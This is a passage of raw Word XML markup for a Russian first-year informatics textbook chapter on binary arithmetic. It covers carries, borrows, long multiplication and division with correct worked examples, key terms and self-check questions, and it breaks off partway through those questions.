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УЧЕБНИК ПО ИНФОРМАТИКЕ</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Для студентов первого курса</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>2026</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>ОГЛАВЛЕНИЕ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.1: Арифметика в двоичной системе счисления</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Двоичная система счисления является фундаментом всей современной вычислительной техники. Все операции, которые выполняет компьютер, в конечном счете сводятся к манипуляциям с двоичными числами — последовательностями нулей и единиц. Понимание арифметических операций в двоичной системе необходимо для глубокого понимания принципов работы ЭВМ, программирования низкого уровня и оптимизации алгоритмов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава тесно связана с темами систем счисления (глава 1.11) и представления числовых данных в памяти компьютера (глава 1.9). Освоив двоичную арифметику, вы получите прочную основу для изучения архитектуры процессора и машинных команд.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе мы последовательно рассмотрим четыре основные арифметические операции — сложение, вычитание, умножение и деление — применительно к двоичным числам, изучим правила переноса и заёма разрядов, а также решим практические задачи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Основные принципы двоичной арифметики</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Двоичная система счисления: краткое напоминание</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Двоичная система счисления</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это позиционная система счисления с основанием 2, в которой для представления чисел используются только две цифры: 0 и 1. Каждая позиция (разряд) двоичного числа представляет степень числа 2.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Например, двоичное число 1011₂ в десятичной системе равно:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1011₂ = 1×2³ + 0×2² + 1×2¹ + 1×2⁰ = 8 + 0 + 2 + 1 = 11₁₀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Разряды и веса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В двоичном числе, как и в десятичном, существуют разряды различного веса:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Младший разряд (rightmost bit) — разряд с наименьшим весом (2⁰ = 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Старший разряд (leftmost bit) — разряд с наибольшим весом</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При выполнении арифметических операций мы всегда начинаем с младшего разряда</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Сложение двоичных чисел</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Правила сложения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Сложение двоичных чисел выполняется поразрядно, начиная с младшего разряда, точно так же, как сложение десятичных чисел. Основные правила сложения двоичных цифр:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0 + 0 = 0</w:t>
        <w:br/>
        <w:t>0 + 1 = 1</w:t>
        <w:br/>
        <w:t>1 + 0 = 1</w:t>
        <w:br/>
        <w:t>1 + 1 = 10 (0 с переносом 1 в следующий разряд)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>При сложении трёх единиц (с учётом переноса):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1 + 1 + 1 = 11 (1 с переносом 1 в следующий разряд)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Перенос разряда</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Перенос (carry)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> возникает, когда сумма цифр в текущем разряде превышает максимальное значение (1 для двоичной системы). Перенос добавляется к следующему (более старшему) разряду.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры сложения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сложим 101₂ + 11₂</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">    101    (5₁₀)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  +  11    (3₁₀)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -----</w:t>
        <w:br/>
        <w:t xml:space="preserve">   1000    (8₁₀)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пошаговое выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Младший разряд: 1 + 1 = 10 → записываем 0, переносим 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Второй разряд: 0 + 1 + 1(перенос) = 10 → записываем 0, переносим 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Третий разряд: 1 + 0 + 1(перенос) = 10 → записываем 0, переносим 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Четвёртый разряд: 0 + 0 + 1(перенос) = 1 → записываем 1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Сложим 1101₂ + 1011₂</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  ¹¹¹     (переносы)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   1101   (13₁₀)</w:t>
        <w:br/>
        <w:t xml:space="preserve"> + 1011   (11₁₀)</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ------</w:t>
        <w:br/>
        <w:t xml:space="preserve">  11000   (24₁₀)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Проверка: 13 + 11 = 24 ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Вычитание двоичных чисел</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Правила вычитания</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Вычитание двоичных чисел также выполняется поразрядно. Основные правила:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0 - 0 = 0</w:t>
        <w:br/>
        <w:t>1 - 0 = 1</w:t>
        <w:br/>
        <w:t>1 - 1 = 0</w:t>
        <w:br/>
        <w:t>0 - 1 = 1 (с заёмом 1 из следующего разряда)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Заём из старшего разряда</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Когда мы вычитаем 1 из 0, необходимо взять </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>заём (borrow)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> из следующего более старшего разряда. Заём работает аналогично десятичному вычитанию: занимаем 1 из старшего разряда, что даёт нам 2 в текущем разряде (так как основание системы = 2).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры вычитания</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вычтем 11₂ из 101₂</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">   101    (5₁₀)</w:t>
        <w:br/>
        <w:t xml:space="preserve"> -  11    (3₁₀)</w:t>
        <w:br/>
        <w:t xml:space="preserve"> -----</w:t>
        <w:br/>
        <w:t xml:space="preserve">    10    (2₁₀)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пошаговое выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Младший разряд: 1 - 1 = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Второй разряд: 0 - 1 → берём заём из третьего разряда → (10₂ - 1) = 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Третий разряд: (1 - 1 от заёма) = 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 4:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вычтем 110₂ из 1010₂</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  ¹        (заёмы)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   1010    (10₁₀)</w:t>
        <w:br/>
        <w:t xml:space="preserve"> -  110    (6₁₀)</w:t>
        <w:br/>
        <w:t xml:space="preserve"> ------</w:t>
        <w:br/>
        <w:t xml:space="preserve">    100    (4₁₀)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Умножение двоичных чисел</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Правила умножения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Умножение двоичных чисел значительно проще десятичного, так как таблица умножения состоит всего из четырёх случаев:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>0 × 0 = 0</w:t>
        <w:br/>
        <w:t>0 × 1 = 0</w:t>
        <w:br/>
        <w:t>1 × 0 = 0</w:t>
        <w:br/>
        <w:t>1 × 1 = 1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Алгоритм умножения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Умножение выполняется «столбиком», аналогично десятичному:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Умножаем первое число на каждую цифру второго числа</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сдвигаем каждое промежуточное произведение на соответствующее количество позиций влево</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Складываем все промежуточные произведения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры умножения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 5:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Умножим 101₂ × 11₂</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">      101     (5₁₀)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ×  11     (3₁₀)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -----</w:t>
        <w:br/>
        <w:t xml:space="preserve">      101     (5 × 1)</w:t>
        <w:br/>
        <w:t xml:space="preserve">     101      (5 × 1, сдвиг на 1 позицию)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -----</w:t>
        <w:br/>
        <w:t xml:space="preserve">     1111     (15₁₀)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Проверка: 5 × 3 = 15 ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 6:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Умножим 110₂ × 101₂</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">       110    (6₁₀)</w:t>
        <w:br/>
        <w:t xml:space="preserve">     × 101    (5₁₀)</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -----</w:t>
        <w:br/>
        <w:t xml:space="preserve">       110    (6 × 1)</w:t>
        <w:br/>
        <w:t xml:space="preserve">      000     (6 × 0, сдвиг на 1)</w:t>
        <w:br/>
        <w:t xml:space="preserve">     110      (6 × 1, сдвиг на 2)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ------</w:t>
        <w:br/>
        <w:t xml:space="preserve">    11110     (30₁₀)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Проверка: 6 × 5 = 30 ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Деление двоичных чисел</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Алгоритм деления</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Деление двоичных чисел выполняется методом, аналогичным делению «уголком» в десятичной системе. Процесс проще, чем в десятичной арифметике, так как на каждом шаге в частное записывается либо 0, либо 1.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Алгоритм:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сравниваем делитель с текущей группой цифр делимого</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если делитель меньше или равен — записываем 1 в частное и вычитаем делитель</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если делитель больше — записываем 0 в частное</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Сносим следующую цифру делимого и повторяем</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры деления</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 7:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Разделим 1100₂ ÷ 11₂</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  1100 ÷ 11 = 100</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  1100 |11</w:t>
        <w:br/>
        <w:t xml:space="preserve"> -11   |---</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ---  |100</w:t>
        <w:br/>
        <w:t xml:space="preserve">   00</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Проверка: 12 ÷ 3 = 4, то есть 1100₂ ÷ 11₂ = 100₂ ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 8:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Разделим 10110₂ ÷ 110₂</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">  10110 ÷ 110 = 11 (остаток 100)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">   10110 |110</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -110   |---</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ----  | 11</w:t>
        <w:br/>
        <w:t xml:space="preserve">    1010</w:t>
        <w:br/>
        <w:t xml:space="preserve">   -110</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ----</w:t>
        <w:br/>
        <w:t xml:space="preserve">    100  (остаток)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Проверка: 22 ÷ 6 = 3 остаток 4 ✓</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Практическая значимость двоичной арифметики</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Применение в вычислительной технике</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Процессоры**: Арифметико-логическое устройство (АЛУ) процессора выполняет все операции с двоичными числами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Программирование**: Побитовые операции активно используются для оптимизации кода</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сетевые технологии**: IP-адреса, маски подсетей оперируют двоичной арифметикой</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Криптография**: Многие алгоритмы шифрования основаны на операциях с битами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Преимущества двоичной системы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Простота реализации**: Всего два состояния (включено/выключено, есть ток/нет тока)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Надёжность**: Легко отличить 0 от 1 даже при наличии помех</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Простота арифметических операций**: Минимальные таблицы сложения и умножения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Универсальность**: Любую информацию можно представить в двоичном виде</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Распространённые ошибки и как их избежать</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ошибка при переносе разрядов**: Всегда ведите запись переносов над числами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Путаница с заёмами**: При вычитании чётко отмечайте разряды, из которых берётся заём</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Невнимательность при сдвигах**: При умножении тщательно выравнивайте промежуточные произведения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Проверяйте результаты**: Переводите числа в десятичную систему и проверяйте ответ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Двоичная система счисления</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — позиционная система счисления с основанием 2, использующая две цифры: 0 и 1.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Разряд (бит)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — позиция цифры в двоичном числе, определяющая вес этой цифры.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Перенос (carry)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — единица, передаваемая в следующий старший разряд при сложении, когда сумма цифр текущего разряда превышает основание системы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Заём (borrow)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — единица, взятая из старшего разряда при вычитании, когда цифра уменьшаемого меньше цифры вычитаемого.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Младший разряд (LSB — Least Significant Bit)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — крайний правый разряд двоичного числа с наименьшим весом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Старший разряд (MSB — Most Significant Bit)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — крайний левый разряд двоичного числа с наибольшим весом.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Поразрядная операция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — операция, выполняемая независимо над каждым разрядом числа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы для самопроверки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Выполните сложение**: 1110₂ + 1011₂. Проверьте результат, переведя числа в десятичную систему.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Выполните вычитание**: 10101₂ - 1110₂. Отметьте все случаи заёма из старших разрядов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
